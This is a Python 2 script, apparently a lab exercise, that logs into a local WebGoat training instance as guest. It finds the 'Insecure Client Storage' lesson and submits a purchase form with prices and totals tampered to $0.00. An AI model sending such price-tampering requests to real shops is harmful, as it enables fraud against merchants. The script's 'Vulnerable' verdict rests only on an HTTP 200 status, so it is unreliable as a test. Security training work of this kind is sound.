import requests
import json
loginurl = 'http://127.0.0.1:8080/WebGoat/login.mvc'
authurl = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'
menuurl = 'http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc'
attackurl = 'http://127.0.0.1:8080/WebGoat/'
login = {"username":"guest", "password":"guest"}
purchase = {"PRC1":"%240.00", "QTY1":"11", "TOT1":"%240.00", "PRC2":"%240.00", "QTY2":"1", "TOT2":"%240.00", "PRC3":"240.00", "QTY3":"1", "TOT3":"%240.00", "PRC4":"%240.00", "QTY4":"1", "TOT4":"%240.00", "SUBTOT":"%240.00", "GRANDTOT":"%240.00","field2":"4128+3214+0002+1999", "field1":"rgrsehreh", "SUBMIT":"Purchase"}

session = requests.Session()
first = session.get(loginurl)
second = session.post(authurl, login)
third = session.get(menuurl)

for entry in range(len(third.json())):
  if third.json()[entry]['name'] == "AJAX Security":
    for child in range(len(third.json()[entry]['children'])):
       if third.json()[entry]['children'][child]['name'] == "Insecure Client Storage":
         attackurl += third.json()[entry]['children'][child]['link']

fourth = session.get(attackurl)

fifth = session.post(attackurl, purchase)
if fifth.status_code == 200:
  print "Vulnerable"
else:
  print "No Vulnerability"
